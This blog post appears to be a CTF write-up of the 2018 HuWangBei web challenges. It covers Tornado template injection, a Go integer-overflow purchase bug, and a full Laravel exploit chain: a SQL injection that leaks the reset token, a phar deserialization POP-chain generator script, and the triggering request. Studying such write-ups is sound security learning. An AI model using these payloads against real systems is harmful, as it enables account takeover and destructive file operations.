---
title: 护网杯-web
date: 2018-10-14 18:16:01
tags:
	- ctf
---

# 前言

实力证明还是我还是最菜的那个，总之没写出来什么题，而且由于web题目都关了，复现也比较复杂，这里我也就简单记录下思路，防止以后忘了也能看下，4uuu师傅出的`ez_laravel`给了docker镜像，详细分析和复现下，确实是一道好题，膜4uuu师傅。

https://github.com/sco4x0/huwangbei2018_easy_laravel

想看wp的可以看

http://n3k0sec.top/2018/10/13/%E6%8A%A4%E7%BD%91%E6%9D%AFwp/#WEB

https://xz.aliyun.com/t/2893#toc-15

https://xz.aliyun.com/t/2892

http://www.venenof.com/index.php/archives/565/

https://www.anquanke.com/post/id/161849

https://qvq.im/post/%E6%8A%A4%E7%BD%91%E6%9D%AF2018%20easy_laravel%E5%87%BA%E9%A2%98%E8%AE%B0%E5%BD%95

https://xz.aliyun.com/t/2897

最后，web狗只复现web（因为别的也看不懂。

# ez_tornado

有个会进行验证的文件读取

```
token=md5(serect_cookie+md5(filename))
```

然后在报错页面存在模板注入，过滤了相当多的的关键字，一开始往沙箱逃逸想去了，而且没有怎么接触过tornado确实不怎么熟。

最后，可以用`{{handler.settings}}`中获取到`serect_cookie`的值

![](护网杯-web\1.png)

用这个值生成对应的`token`就可以任意文件读取获得flag

# ltshop

买辣条。一开始在寻找可以污染的输入点，发现就只有大辣条的数量接受了外部传参，然后还是做了蛮多过滤的。

小辣条那里本来的钱就只够4个辣条，条件竞争，就可以买到4个以上的辣条，这样，也只是够买1个大辣条。

之后就到了不会的领域。虽然看出了是go语言写的，但是无奈不会（web狗学不过来啊啊啊啊

这里猜测数据类型为`uint64`，最大长度为`2^64-1`

这里由于是5包换一包，这样只要我们买`(2^64)/5+1`的大辣条，在判断数量的时候就会存在

```
num*5 < 1
```

这样，我们就可以利用整数溢出，用5个辣条买到`(2^64)/5+1`的大辣条，也就足以买到flag

# ez_web

看wp是fast_json的命令执行，无奈java也不咋会，先空着吧

# ez_laravel

一开始在html中能看到给出了github地址，可以直接下载下源码

好吧，后面就真的菜了，首先没接触过`laravel`，其次`composer`也不咋了解，只知道是个包管理器。（还是不bb了直接说解法

先通过`composer install`可以下载回所有的依赖

然后审计源码可以发现，登录、注册、找回密码都是用的框架的模块，从而漏洞点应该不在这几个逻辑中

在`note`的功能模块中，有个比较明显的注入

```php
public function index(Note $note)
{
    $username = Auth::user()->name;
    $notes = DB::select("SELECT * FROM `notes` WHERE `author`='{$username}'");
    return view('note', compact('notes'));
}
```

![](护网杯-web\2.png)

用户密码入库前肯定是做了加盐哈希等操作，所以不太可能还原密码

然后就是一个找回密码的功能，找回密码的时候会设置一个token值，只有当token值和发往用户邮箱的token值一致才能重置密码，这个token值是被存放在数据库中的，但是按出题人的说法，也只有在`5.4`版本以明文的形式存储

> 这也是使用 Laravel 5.4的原因，在高于5.4的版本中，重置密码这个 token 会被 bcrypt 再存入，就和用户密码一样

然后就可以申请重置管理密码，然后得到token，（字段名和表名在`migrations`的记录里可以看到的

```
asdf' union select 1,(select token from password_resets),3,4,5#
```

![](护网杯-web\3.png)

然后去访问

```
http://192.168.85.144/password/reset/85a8a09e22819c0298ce4334b6dd357a1ec51ac10335575718f218ff93faddf5
```

就可以修改管理员的密码

然后访问`/flag`页面的时候显示的是没有`no flag`，这是由于`laravel`的页面模板缓存机制导致的

提示给了`pop chain`就说明需要反序列化，可以看到

```php
public function check(Request $request)
{
    $path = $request->input('path', $this->path);
    $filename = $request->input('filename', null);
    if($filename){
        if(!file_exists($path . $filename)){
            Flash::error('磁盘文件已删除，刷新文件列表');
        }else{
            Flash::success('文件有效');
        }
    }
    return redirect(route('files'));
}
```

可以看到`file_exists($path . $filename)`中文件名是全部可控的，这样，就i可以利用`phar`进行反序列化，删掉模板文件，更新缓存。恰巧还有个文件上传的点

然后就是寻找pop 链，自己写的代码逻辑部分不是很多，但是可以利用`larvael`中的各种类

`easy_laravel/vendor/swiftmailer/swiftmailer/lib/classes/Swift/ByteStream/TemporaryFileByteStream.php:36`

```php
public function __destruct()
{
    if (file_exists($this->getPath())) {
        @unlink($this->getPath());
    }
}
```

然后就是构造`phar`反序列化包

还有两个点就是，文件路径和缓存文件名是多少呢

文件路径的化可以通过admin的note中说默认配置猜测路径为`/usr/share/nginx/html/`

其次就是文件名，这个可以从源码中找到

```php
public function getCompiledPath($path)
{
    return $this->cachePath.'/'.sha1($path).'.php';
}
```

$path的值就是模板的位置，为`/usr/share/nginx/html/resources/views/auth/flag.blade.php`

这样，缓存文件的文件具体路径就是`/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php`

就可以构造phar包

```php
<?php
abstract class Swift_ByteStream_AbstractFilterableInputStream 
{
    protected $_sequence = 0;
    private $_filters = array();
    private $_writeBuffer = '';
    private $_mirrors = array();
}
class Swift_ByteStream_FileByteStream extends Swift_ByteStream_AbstractFilterableInputStream {
    private $_offset = 0;
    private $_path;
    private $_mode;
    private $_reader;
    private $_writer;
    private $_quotes = false;
    private $_seekable = null;

    public function __construct($path, $writable = false)
    {
        $this->_path = $path;
        $this->_mode = $writable ? 'w+b' : 'rb';

        if (function_exists('get_magic_quotes_runtime') && @get_magic_quotes_runtime() == 1) {
            $this->_quotes = true;
        }
    }

    public function getPath()
    {
        return $this->_path;
    }
}


class Swift_ByteStream_TemporaryFileByteStream extends Swift_ByteStream_FileByteStream
{
    public function __construct()
    {
        $filePath = "/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php";

        if ($filePath === false) {
            throw new Swift_IoException('Failed to retrieve temporary file name.');
        }

        parent::__construct($filePath, true);
    }
}
unlink("1.phar");
$p = new Phar('./1.phar', 0);
$p->startBuffering();
$p->setStub('GIF89a<?php __HALT_COMPILER(); ?>');
$p->addFromString('1.txt','text');
$obj = new Swift_ByteStream_TemporaryFileByteStream();
$p->setMetadata($obj);
$p->stopBuffering();
```

重命名为`1.gif`上传即可，然后点击`check`，抓包修改其中的参数

![](护网杯-web\4.png)

```
path=phar:///usr/share/nginx/html/storage/app/public&filename=%2F1.gif/1.txt&_token=onbNiZDmpgIkhUu3Uh2z8Xlsg3vlOBfCrJgCVgql
```

就可以看到flag

![](护网杯-web\5.png)



# 总结

最后，还记得打完N1ctf看一个老外的wp，有那么一句话

```
easy is not easy
```

看来是

```
easy is never easy
```

题目还是不错的，膜4uuu师傅，本web狗已凉



